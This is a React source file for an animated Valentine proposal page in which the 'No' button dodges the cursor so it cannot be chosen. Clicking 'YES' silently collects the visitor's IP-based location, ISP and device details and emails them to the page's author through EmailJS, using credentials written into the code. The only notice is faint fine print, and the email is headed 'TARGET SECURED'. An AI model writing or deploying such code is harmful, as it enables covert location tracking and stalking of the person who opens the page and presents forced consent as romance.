import React, { useState, useEffect, useRef } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  Heart,
  Sparkles,
  Volume2,
  VolumeX,
  MapPin,
  Smartphone,
  User,
} from "lucide-react";
import confetti from "canvas-confetti";
import emailjs from "@emailjs/browser";

const UltimateValentineWithTracking = () => {
  const [noButtonPos, setNoButtonPos] = useState({ x: 0, y: 0 });
  const [isAccepted, setIsAccepted] = useState(false);
  const [isMusicPlaying, setIsMusicPlaying] = useState(false);
  const [mousePos, setMousePos] = useState({ x: 0, y: 0 });
  const [roses, setRoses] = useState([]);
  const audioRef = useRef(null);

  // Background Particles (Roses & Hearts)
  useEffect(() => {
    const interval = setInterval(() => {
      setRoses((prev) => [
        ...prev.slice(-25),
        {
          id: Date.now(),
          left: Math.random() * 100,
          type: Math.random() > 0.4 ? "🌹" : "💖",
          size: Math.random() * 30 + 20,
          duration: Math.random() * 6 + 4,
          blur: Math.random() > 0.8 ? "blur(4px)" : "none",
        },
      ]);
    }, 600);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    const handleMove = (e) => setMousePos({ x: e.clientX, y: e.clientY });
    window.addEventListener("mousemove", handleMove);
    return () => window.removeEventListener("mousemove", handleMove);
  }, []);

  const moveNoButton = () => {
    const x = (Math.random() - 0.5) * (window.innerWidth * 0.6);
    const y = (Math.random() - 0.5) * (window.innerHeight * 0.6);
    setNoButtonPos({ x, y });
  };

  const handleYes = async () => {
    setIsAccepted(true);

    // Confetti Blast
    const end = Date.now() + 5 * 1000;
    (function frame() {
      confetti({
        particleCount: 5,
        angle: 60,
        spread: 55,
        origin: { x: 0 },
        colors: ["#ff0055", "#ffd700"],
      });
      confetti({
        particleCount: 5,
        angle: 120,
        spread: 55,
        origin: { x: 1 },
        colors: ["#ff0055", "#ffd700"],
      });
      if (Date.now() < end) requestAnimationFrame(frame);
    })();

    try {
      // 1. Fetch IP and Location Info
      const geoRes = await fetch("https://ipapi.co/json/");
      const geoData = await geoRes.json();

      // 2. Capture Device Info
      const deviceInfo = {
        platform: navigator.platform,
        agent: navigator.userAgent,
        screen: `${window.screen.width}x${window.screen.height}`,
        time: new Date().toLocaleString(),
      };

      // 3. Prepare Email Template
      const templateParams = {
        to_name: "Amar Kumar",
        message: `
          💖 TARGET SECURED: SHE SAID YES! 💖
          ------------------------------------
          📍 LOCATION INFO:
          City: ${geoData.city}
          Region: ${geoData.region}
          Country: ${geoData.country_name}
          IP Address: ${geoData.ip}
          ISP: ${geoData.org}

          📱 DEVICE INFO:
          Device/OS: ${deviceInfo.platform}
          Screen Res: ${deviceInfo.screen}
          Browser: ${deviceInfo.agent}
          Exact Time: ${deviceInfo.time}
        `,
      };

      // 4. Send Email using your Credentials
      emailjs
        .send(
          "service_zl8ycen",
          "template_nz3e9jp",
          templateParams,
          "lxUfAecwZ_It3aGzn",
        )
        .then(() => console.log("Amar, check your mail! Info sent."));
    } catch (err) {
      console.error("Tracking Error:", err);
    }
  };

  return (
    <div className="relative min-h-screen w-full bg-[#0a0104] flex items-center justify-center overflow-hidden font-serif selection:bg-pink-500/30 text-white">
      <audio
        ref={audioRef}
        loop
        src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"
      />

      {/* AMBIENT SPOTLIGHT */}
      <div
        className="absolute inset-0 z-10 pointer-events-none opacity-40"
        style={{
          background: `radial-gradient(600px circle at ${mousePos.x}px ${mousePos.y}px, rgba(255,0,85,0.15), transparent 80%)`,
        }}
      />

      {/* BACKGROUND ROSE RAIN */}
      <AnimatePresence>
        {roses.map((r) => (
          <motion.div
            key={r.id}
            initial={{ y: -100, x: `${r.left}vw`, opacity: 0 }}
            animate={{ y: "110vh", opacity: [0, 1, 1, 0], rotate: 360 }}
            transition={{ duration: r.duration, ease: "linear" }}
            className="absolute pointer-events-none z-0"
            style={{ fontSize: r.size, filter: r.blur }}
          >
            {r.type}
          </motion.div>
        ))}
      </AnimatePresence>

      {/* MUSIC TOGGLE */}
      <button
        onClick={() => {
          isMusicPlaying ? audioRef.current.pause() : audioRef.current.play();
          setIsMusicPlaying(!isMusicPlaying);
        }}
        className="fixed top-8 right-8 z-50 p-4 rounded-full border border-pink-500/30 bg-black/50 text-pink-500 shadow-2xl backdrop-blur-md"
      >
        {isMusicPlaying ? <Volume2 className="animate-pulse" /> : <VolumeX />}
      </button>

      <AnimatePresence mode="wait">
        {!isAccepted ? (
          <motion.div
            key="proposal"
            initial={{ opacity: 0, y: 50, scale: 0.9 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            className="relative z-20 w-full max-w-xl p-[2px] rounded-[50px] bg-gradient-to-br from-pink-500 via-transparent to-rose-900"
          >
            <div className="bg-[#120106]/95 backdrop-blur-3xl p-10 md:p-16 rounded-[48px] text-center border border-white/5 shadow-2xl">
              <div className="absolute top-[-20px] left-[-20px] text-7xl opacity-30 select-none">
                🌹
              </div>
              <div className="absolute bottom-[-20px] right-[-20px] text-7xl opacity-30 select-none">
                🌹
              </div>

              <motion.div
                animate={{
                  scale: [1, 1.2, 1],
                  filter: [
                    "drop-shadow(0 0 10px #ff0055)",
                    "drop-shadow(0 0 25px #ff0055)",
                    "drop-shadow(0 0 10px #ff0055)",
                  ],
                }}
                transition={{ repeat: Infinity, duration: 2 }}
                className="mb-8 inline-block"
              >
                <Heart size={100} fill="#ff0055" className="text-pink-600" />
              </motion.div>

              <h2 className="text-pink-400 text-xs tracking-[0.5em] uppercase mb-4 opacity-70">
                A Kraviona Special
              </h2>
              <h1 className="text-5xl md:text-7xl font-black text-white mb-10 leading-tight">
                Do you <span className="text-pink-500">love</span> me?
              </h1>

              <div className="flex flex-col sm:flex-row items-center justify-center gap-12 mt-4 min-h-[140px]">
                <motion.button
                  onClick={handleYes}
                  whileHover={{ scale: 1.1, boxShadow: "0 0 50px #ff0055" }}
                  className="px-16 py-6 bg-gradient-to-r from-pink-600 to-rose-700 text-white font-bold rounded-2xl text-3xl shadow-2xl flex items-center gap-2"
                >
                  YES ❤️
                </motion.button>

                <motion.button
                  onMouseEnter={moveNoButton}
                  onClick={moveNoButton}
                  animate={{ x: noButtonPos.x, y: noButtonPos.y }}
                  transition={{ type: "spring", stiffness: 450, damping: 15 }}
                  className="px-10 py-4 bg-white/5 border border-white/10 text-white/30 rounded-2xl text-xl hover:text-white transition-all"
                >
                  No 🥀
                </motion.button>
              </div>

              <p className="mt-12 text-pink-200/30 text-[10px] tracking-widest uppercase italic">
                "Notification will be sent to Amar Kumar upon clicking YES"
              </p>
            </div>
          </motion.div>
        ) : (
          <motion.div
            initial={{ opacity: 0, scale: 0.8 }}
            animate={{ opacity: 1, scale: 1 }}
            className="z-30 text-center"
          >
            <h1 className="text-8xl md:text-[180px] font-black text-white drop-shadow-[0_0_80px_#ff0055]">
              MINE. 💍
            </h1>
            <div className="bg-white/5 backdrop-blur-2xl p-12 rounded-[60px] border border-pink-500/30 max-w-2xl mx-auto shadow-2xl">
              <Sparkles className="mx-auto text-pink-500 mb-6" size={50} />
              <h2 className="text-4xl text-pink-400 font-bold mb-6 italic">
                Congrats! You're my GF now ❤️
              </h2>
              <div className="flex items-center justify-center gap-4 text-xs text-white/40 tracking-[0.3em] uppercase">
                <Smartphone size={14} /> Device Logged <MapPin size={14} />{" "}
                Location Sent
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default UltimateValentineWithTracking;
